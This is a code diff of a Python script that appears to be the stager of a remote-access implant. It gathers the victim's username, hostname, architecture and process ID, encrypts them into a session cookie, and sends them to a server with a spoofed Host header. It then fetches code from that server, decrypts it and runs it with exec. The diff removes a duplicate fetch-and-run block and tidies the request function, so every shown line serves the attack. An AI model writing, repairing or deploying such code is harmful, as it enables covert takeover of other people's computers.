@@ -28,22 +28,15 @@ un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
 encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
-headers = ({'Host':hh[0],'User-Agent':ua,'Cookie':'SessionID=%s' % encsid.decode("utf-8")})
-request = urllib2.Request(url2, headers=headers);response = urllib2.urlopen(request);html = response.read().decode('utf-8');x=decrypt(key, html)
-exec(base64.b64decode(x))
-un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
-is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
-hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
 
 def send_request(uri, headers=None, data=None):
 
-    url = f"{serverclean[0]}{uri}"
+    url = serverclean[0] + uri
 
     if ua and not hh:
-        request_headers = ({"User-Agent": f"{ua}"})
+        request_headers = ({"User-Agent": ua})
     elif ua and hh:
-        request_headers = ({"User-Agent": f"{ua}", "Host": f"{hh[0]}"})
+        request_headers = ({"User-Agent": ua, "Host": hh[0]})
 
     if headers:
         request_headers.update(headers)
@@ -64,4 +57,5 @@ def send_request(uri, headers=None, data=None):
     except Exception as e:
         return None
 
-exec(send_request(x, headers={'Cookie':'SessionID=%s' % encsid}))
+core = send_request(url2, headers={'Cookie':'SessionID=%s' % encsid})
+exec(core)
